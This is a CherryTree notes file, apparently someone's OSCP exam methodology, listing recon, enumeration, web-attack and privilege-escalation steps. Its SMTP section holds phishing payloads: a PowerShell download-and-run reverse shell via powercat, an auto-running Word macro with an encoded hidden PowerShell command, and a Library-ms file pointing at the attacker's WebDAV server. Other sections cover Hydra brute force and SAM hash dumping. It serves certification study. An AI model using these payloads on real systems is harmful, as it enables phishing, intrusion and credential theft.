<?xml version="1.0" encoding="UTF-8"?>
<cherrytree>
  <bookmarks list=""/>
  <node name="OSCP Methodology" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="11" is_bold="1" foreground="" ts_creation="1569564485" ts_lastsave="1689414521">
    <rich_text>Use this manual: </rich_text>
    <rich_text link="webs https://book.hacktricks.xyz">https://book.hacktricks.xyz</rich_text>
    <rich_text>
Reverse shell cheatsheet: </rich_text>
    <rich_text link="webs https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</rich_text>
    <rich_text>
Reverse shell generator: </rich_text>
    <rich_text link="webs https://www.revshells.com/">https://www.revshells.com/</rich_text>
    <node name="Initial Recon" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="14" is_bold="0" foreground="" ts_creation="1569560343" ts_lastsave="1688827378">
      <rich_text>OS Check (NMap):
</rich_text>
      <rich_text justification="left"></rich_text>
      <codebox char_offset="17" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap -O {IP}</codebox>
      <node name="ENUM" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572497353" ts_lastsave="1688827326">
        <rich_text>Start deep enum process with AutoRecon.py (https://github.com/Tib3rius/AutoRecon.git):
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Enumerate again every port (NMap):
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

Enumerate every service (NMap):
</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="87" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python3 autorecon.py -o {output directory} {IP} -vv</codebox>
        <codebox char_offset="125" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap -p- {IP}</codebox>
        <codebox char_offset="160" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap -p {service port} {IP}</codebox>
      </node>
      <node name="VULN &amp; EXPLOIT CHECK" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572497437" ts_lastsave="1688828328">
        <rich_text>For every service found, we have to check the version on:
- ExploitDB
- SearchSploit
- Rapid7

For every port with unidentified service we have to check “</rich_text>
        <rich_text weight="heavy">port number + exploit</rich_text>
        <rich_text>”  and check EVERY exploit for working.
When an exploit is in Python2, we either:
- repair it easily
- get an existing updated version from issues or other branches in GitHub/GitLab etc.

If an exploit gives us patched message or doesn't work, WE HAVE TO CHECK ANOTHER ONE, SAME SERVICE TO MAKE SURE THAT SERVICE IS UNEXPLOITABLE.</rich_text>
      </node>
    </node>
    <node name="SERVICE ENUM " unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="39" is_bold="0" foreground="" ts_creation="1579569598" ts_lastsave="1688828388">
      <rich_text>We have to enumerate every service and gather as much information as possible.</rich_text>
      <node name="TCP" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1569559292" ts_lastsave="1689500233">
        <rich_text>We will find the service report from AutoRecon.py, name Full TCP Scan.</rich_text>
        <node name="FTP" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569560997" ts_lastsave="1688829046">
          <rich_text>- find the version, maybe it's a vulnerable one
- check if we are allowed anonymous login (user: anonymous)
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
- get the certificate, if any
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

We can try brute-force with Hydra (any username that we may find):
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

More possible exploits here: </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp</rich_text>
          <codebox char_offset="108" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo nmap -sV -p21 -sC -A {IP}</codebox>
          <codebox char_offset="140" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">openssl s_client -connect crossfit.htb:21 -starttls ftp</codebox>
          <codebox char_offset="210" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l {username} -P {wordlist} {IP} ftp</codebox>
        </node>
        <node name="SSH" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569559597" ts_lastsave="1688829327">
          <rich_text>- check vulnerable version, some may allow </rich_text>
          <rich_text style="italic">username enumeration</rich_text>
          <rich_text> time-based
- audit the entire service using SSH-audit (</rich_text>
          <rich_text link="webs https://github.com/jtesta/ssh-audit">https://github.com/jtesta/ssh-audit</rich_text>
          <rich_text>)

We can try brute-force with Hydra (any username that we may find):
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

More possible exploits here: </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh</rich_text>
          <codebox char_offset="224" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l {username} -P {wordlist} {IP} ftp</codebox>
        </node>
        <node name="DNS" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1688829378" ts_lastsave="1688829832">
          <rich_text>- try zone transfer
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
- try reverse IP lookup
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
More exploits: </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns">https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns</rich_text>
          <rich_text> </rich_text>
          <codebox char_offset="20" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dig axfr @&lt;DNS_IP&gt;
dig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt;</codebox>
          <codebox char_offset="46" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dig -x {IP} @&lt;DNS_IP&gt;</codebox>
        </node>
        <node name="HTTP" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569558367" ts_lastsave="1688832531">
          <rich_text>We have to </rich_text>
          <rich_text weight="heavy">Dirbust</rich_text>
          <rich_text> and </rich_text>
          <rich_text weight="heavy">Feroxbust</rich_text>
          <rich_text> using good wordlists:
- /usr/share/seclists/Discovery/Web-Content/big.txt
- /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
- /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt (if medium had no results)

Also we have to check:
- intersting exntensions (</rich_text>
          <rich_text style="italic">docx</rich_text>
          <rich_text>, </rich_text>
          <rich_text style="italic">pdf</rich_text>
          <rich_text>, </rich_text>
          <rich_text style="italic">txt</rich_text>
          <rich_text>, </rich_text>
          <rich_text style="italic">php</rich_text>
          <rich_text>, </rich_text>
          <rich_text style="italic">sql</rich_text>
          <rich_text>)
- we have to check recursive
- check if git is present on the server
- check page contents, maybe credentials or something helpful is already there
- check comments
- check cookies and session</rich_text>
          <node name="SQL injections" unique_id="60" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572496816" ts_lastsave="1688831912">
            <rich_text>- check with quote “ ' ”
- check the request in network tab for errors
- check for time differences between </rich_text>
            <rich_text weight="heavy">normal requests</rich_text>
            <rich_text> and </rich_text>
            <rich_text weight="heavy">ones that may have errors</rich_text>
            <rich_text>

More on SQL injections:
- </rich_text>
            <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/sql-injection">https://book.hacktricks.xyz/pentesting-web/sql-injection</rich_text>
            <rich_text>
- </rich_text>
            <rich_text link="webs https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</rich_text>
            <rich_text>
</rich_text>
          </node>
          <node name="SSRF" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572496888" ts_lastsave="1689364066">
            <rich_text>- if Windows, we can capture the Kerberos Ticket using Responder and SSRF
- we can check for firwalls by checkinf if we get a request on more stranger ports (open a HTTP server on our machine on 4444 and try to get a request)

More on that here: </rich_text>
            <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery">https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery</rich_text>
            <rich_text>

It is also used to get inner services =&gt; we can request </rich_text>
            <rich_text link="webs http://127.0.0.1:21">http://127.0.0.1:21</rich_text>
            <rich_text> and if the connection is refused, then the box does not have FTP running internal (just an example). Check this: </rich_text>
            <rich_text link="webs https://www.resecurity.com/blog/article/blind-ssrf-to-rce-vulnerability-exploitation">https://www.resecurity.com/blog/article/blind-ssrf-to-rce-vulnerability-exploitation</rich_text>
          </node>
          <node name="LFI &amp; RFI" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688830874" ts_lastsave="1688832516">
            <rich_text>- we can try to include shells from our server
[For LFI] we can poison the access logs requiresting </rich_text>
            <rich_text link="webs http://url/malicious-payload">http://url/malicious-payload</rich_text>
            <rich_text> then we can include the apache access log in order to execute the PHP payload that we included in it
Places for </rich_text>
            <rich_text weight="heavy">access.log</rich_text>
            <rich_text> </rich_text>
            <rich_text style="italic">/var/log/apache/access. log</rich_text>
            <rich_text>.

More on that here: </rich_text>
            <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/file-inclusion">https://book.hacktricks.xyz/pentesting-web/file-inclusion</rich_text>
          </node>
          <node name="Upload Feature" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688830881" ts_lastsave="1688832905">
            <rich_text>- We can try to get the </rich_text>
            <rich_text weight="heavy">Kerberos Ticket</rich_text>
            <rich_text> with </rich_text>
            <rich_text weight="heavy">Responder</rich_text>
            <rich_text> by catching the </rich_text>
            <rich_text weight="heavy">request used to upload</rich_text>
            <rich_text>, and </rich_text>
            <rich_text weight="heavy">changing the path of the file we want to upload to our responder server</rich_text>
            <rich_text>
- We can try uplading reverse shells

Bypass methods for upload protection: 
- </rich_text>
            <rich_text link="webs https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass">https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass</rich_text>
            <rich_text>
- </rich_text>
            <rich_text link="webs https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/file-upload-bypass">https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/file-upload-bypass</rich_text>
            <rich_text>

More on that here: </rich_text>
            <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/file-upload">https://book.hacktricks.xyz/pentesting-web/file-upload</rich_text>
          </node>
        </node>
        <node name="SMTP" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1688922291" ts_lastsave="1689500906">
          <rich_text>- Check the version, some exim versions might be VULNERABLE.
- Check for </rich_text>
          <rich_text weight="heavy">username enumeration</rich_text>
          <rich_text>

This might be a sign that we can trigger initial intrusion using a client-side attack
We can create a </rich_text>
          <rich_text weight="heavy">config.Library-ms</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Then we can run to start hosting a WebDav server:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
And inside we must create a shortcut that will download PowerCat and start a reverse shell (note that we also have to start a server on port 8000 to host PowerCat):
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For Word Macros. check this example:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For more check here: </rich_text>
          <rich_text link="webs https://github.com/glowbase/macro_reverse_shell">https://github.com/glowbase/macro_reverse_shell</rich_text>
          <rich_text>

We can send emails of the client side attacks using SWAKS:
</rich_text>
          <rich_text link="webs https://www.kali.org/tools/swaks/">https://www.kali.org/tools/swaks/</rich_text>
          <rich_text>
Example:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <rich_text style="italic">--suppress-data</rich_text>
          <rich_text> Summarizes the DATA portion of the SMTP transaction instead of
           printing every line
</rich_text>
          <rich_text style="italic">-ap</rich_text>
          <rich_text> is for providing auth passwords
</rich_text>
          <codebox char_offset="215" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
&lt;version&gt;6&lt;/version&gt;
&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
&lt;templateInfo&gt;
&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
&lt;/templateInfo&gt;
&lt;searchConnectorDescriptionList&gt;
&lt;searchConnectorDescription&gt;
&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
&lt;isSupported&gt;false&lt;/isSupported&gt;
&lt;simpleLocation&gt;
&lt;url&gt;http://{Our IP}&lt;/url&gt;
&lt;/simpleLocation&gt;
&lt;/searchConnectorDescription&gt;
&lt;/searchConnectorDescriptionList&gt;
&lt;/libraryDescription&gt;</codebox>
          <codebox char_offset="268" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/</codebox>
          <codebox char_offset="435" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://{our IP}:8000/powercat.ps1');
powercat -c {our IP} -p 4444 -e powershell"</codebox>
          <codebox char_offset="475" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub</codebox>
          <codebox char_offset="650" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">swaks -t {to email} --from {from email} --attach {local file to attach} --server {IP of SMTP server} --body {txt file with body contents}
--header "Subject: Example" --suppress-data -ap</codebox>
        </node>
        <node name="MSSQL" unique_id="112" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1689500078" ts_lastsave="1689500205">
          <rich_text>Port - 1433
To use: </rich_text>
          <rich_text style="italic">impacket-mssqlclient</rich_text>
          <rich_text>
Check this RCE using impacket-mssqlclient: </rich_text>
          <rich_text link="webs https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/">https://rioasmara.com/2020/05/30/impacket-mssqlclient-reverse-shell/</rich_text>
          <rich_text>
Also the official Kali documentation: </rich_text>
          <rich_text link="webs https://www.kali.org/tools/impacket-scripts/#impacket-mssqlclient">https://www.kali.org/tools/impacket-scripts/#impacket-mssqlclient</rich_text>
          <rich_text>

More documentation on: </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server">https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server</rich_text>
        </node>
        <node name="LDAP" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1689500233" ts_lastsave="1689500339">
          <rich_text>Port - 389 or 636 (for LDAPs - secure)
Use </rich_text>
          <rich_text style="italic">ldapsearch</rich_text>
          <rich_text> to enumerate:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

More on it here: </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap</rich_text>
          <codebox char_offset="68" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -x -b "dc=domain,dc=com" -H ldap://{IP}</codebox>
        </node>
      </node>
      <node name="UDP" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1569559301" ts_lastsave="1579569609">
        <rich_text>[ NMAP OVERVIEW ]</rich_text>
        <node name="SNMP" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569560995" ts_lastsave="1688924091">
          <rich_text>AutoRecon.py will enumerate the service.
Check out:
- onesixtyone
- snmpwalk

Enumerate the last command executed:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
Also check RCE with SNMP (requires community string with write permissions): </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce</rich_text>
          <rich_text>
Also check this out: </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp</rich_text>
          <codebox char_offset="115" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v 1 -c {community string} {IP} NET-SNMP-EXTEND-MIB::nsExtendOutputFull</codebox>
        </node>
      </node>
      <node name="STUCK?" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1569563263" ts_lastsave="1689414543">
        <rich_text weight="heavy">Things to consider</rich_text>
        <rich_text>
- Have you confirmed the service on the port manually and googled all the things (the SSH string, the banner text, the source)?
- Is there a service that will allow you to enumerate something useful (i.e. usernames) but maybe doesn't make that obvious (e.g. RID brute-force through SMB with crackmapexec or lookupsid.py)?
- Have you used the best wordlist possible for your tasks (is there a better/bigger directory list? Is there a SecLists cred list for this service?)
- Have you fuzzed the directories you have found for a) more directories, or b) common filetypes -x php,pl,sh,etc
- Have you tried some manual testing (MySQL, wireshark inspections)
- Have you collected all the hashes</rich_text>
        <rich_text weight="heavy"> and cracked them</rich_text>
        <rich_text>?
- Have you tried ALL COMBINATIONS of the username/passwords and not just the pairs given? Have you tried them across all services/apps?
- Do the version numbers tell you anything about the host?
- Have you tried bruteforce (cewl, patator)?
- Can you think of a way to find more information: More credentials, more URLs, more files, more ports, more access?
- Try usernames found with </rich_text>
        <rich_text weight="heavy">capital letter</rich_text>
        <rich_text>, all </rich_text>
        <rich_text weight="heavy">letters capital</rich_text>
        <rich_text>
- Do you need to relax some of the terms used for searching? Instead of v2.8 maybe we check for anything under 3.
- Do you need a break?
</rich_text>
      </node>
    </node>
    <node name="PRIVILEGE ESCALATION" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1688917213" ts_lastsave="1689415044">
      <rich_text>We have to pay attention to </rich_text>
      <rich_text weight="heavy">files on the machine</rich_text>
      <rich_text>, most of the time, this is how privilege escalation is done.</rich_text>
      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1689416091">
        <rich_text>Use:
- linpeas
- kernel exploit suggester

Check kernel manually:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
</rich_text>
        <rich_text weight="heavy">!Important</rich_text>
        <rich_text>: If we don't have GCC to compille on the box, and we encounter errors when we try to execute the locally compiled exploit, we need to simulate the exploited environment, check this: </rich_text>
        <rich_text link="webs https://github.com/X0RW3LL/XenSpawn">https://github.com/X0RW3LL/XenSpawn</rich_text>
        <rich_text>.

Check files manually:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
- Check </rich_text>
        <rich_text style="italic">/opt</rich_text>
        <rich_text> directory
- Check if </rich_text>
        <rich_text style="italic">/etc/passwd</rich_text>
        <rich_text> writable
- Check if </rich_text>
        <rich_text style="italic">/etc/shadow</rich_text>
        <rich_text> readable/writable
- Check group that we are in with </rich_text>
        <rich_text style="italic">id</rich_text>
        <rich_text> and see what permissions it gives to us (for example, </rich_text>
        <rich_text style="italic">adm</rich_text>
        <rich_text> has access to read logs)

Manually check:
- SUID
- SGID
- Cronjobs (</rich_text>
        <rich_text style="italic">crontab -l</rich_text>
        <rich_text>)
- Check logs for cronjobs
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
- Check insecure system components with </rich_text>
        <rich_text style="italic">getcap</rich_text>
        <rich_text>
- Check processes with </rich_text>
        <rich_text style="italic">ps aux</rich_text>
        <codebox char_offset="66" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">uname -a</codebox>
        <codebox char_offset="321" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -04000 2&gt;/dev/null</codebox>
        <codebox char_offset="620" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep "CRON" /var/log/syslog</codebox>
      </node>
      <node name="Windows" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924320" ts_lastsave="1689504810">
        <rich_text>Use (and read CAREFULLY the output):
- winpeas
- PowerUp
- SharpUp

Pay attention on privilegeges of the user:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
Check the group of the user, maybe we have backup operator
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
Check files using powershell:
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
Extensions to check:
- sql
- sqlite
- db
- txt
- pdf
- doc
- docx
- ps1
- ini
- kdbx (See KeePass)

</rich_text>
        <rich_text weight="heavy">Important:</rich_text>
        <rich_text> Check all files, maybe we have </rich_text>
        <rich_text style="italic">Windows.old</rich_text>
        <rich_text> to extract SAM. Extract it with both </rich_text>
        <rich_text weight="heavy">samdump2</rich_text>
        <rich_text> and </rich_text>
        <rich_text weight="heavy">impacket-secretsdump</rich_text>
        <rich_text>.
Check this: </rich_text>
        <rich_text link="webs https://juggernaut-sec.com/dumping-credentials-sam-file-hashes/#Extracting_the_Hashes_with_secretsdumppy_and_samdump2">https://juggernaut-sec.com/dumping-credentials-sam-file-hashes/#Extracting_the_Hashes_with_secretsdumppy_and_samdump2</rich_text>
        <rich_text>

Check scheduled tasks manually
Check services manually
Check active sessions (PowerView):
- </rich_text>
        <rich_text style="italic">NetWkstaUserEnum</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>
- </rich_text>
        <rich_text style="italic">NetSessionEnum</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="111" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">whoami /all
whoami /priv</codebox>
        <codebox char_offset="172" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">whoami /group</codebox>
        <codebox char_offset="204" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-ChildItem -Filter *.txt -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Recurse | Where {$_.Name -match 'Interesting-Name'} | Select Fullname</codebox>
        <codebox char_offset="672" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-NetLoggedon</codebox>
        <codebox char_offset="691" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Get-NetSession</codebox>
      </node>
      <node name="STUCK?" unique_id="111" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1689415044" ts_lastsave="1689505653">
        <rich_text>- Recheck every line of output from Winpeas/Linpeas
- Recheck files
- Rerun Winpeas/Linpeas
- If in AD, try SharpHound and analyze object ACL - </rich_text>
        <rich_text weight="heavy">Only Windows</rich_text>
        <rich_text>
- Search the build number for privilege escalation exploits - </rich_text>
        <rich_text weight="heavy">Only Windows</rich_text>
        <rich_text>
- Check kernel or build exploit and try them all from WinPeas - </rich_text>
        <rich_text weight="heavy">Only Windows</rich_text>
        <rich_text>
- Always check </rich_text>
        <rich_text weight="heavy">GTFOBins</rich_text>
        <rich_text> for SUIDs and SUDO capabilities (No matter if it look not probable) - </rich_text>
        <rich_text weight="heavy">Only Linux</rich_text>
        <rich_text>
- Always check kernel version and try all exploits -</rich_text>
        <rich_text weight="heavy"> Only Linux</rich_text>
        <rich_text>

!For some reason samdump2 failed here as the both the NT and LM are coming up as blank for all accounts. This is exactly why we need to have multiple tools to accomplish a single task. When one fails, we can try another.</rich_text>
      </node>
    </node>
    <node name="AD" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1569561597" ts_lastsave="1689416622">
      <rich_text>Here it will be AD</rich_text>
      <node name="Post-Exploitation" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569563672" ts_lastsave="1689416627">
        <rich_text>Here it will be Post Expl</rich_text>
      </node>
      <node name="Lateral Movement" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569564136" ts_lastsave="1689416635">
        <rich_text>Here it will be Lat Movement</rich_text>
      </node>
    </node>
  </node>
</cherrytree>
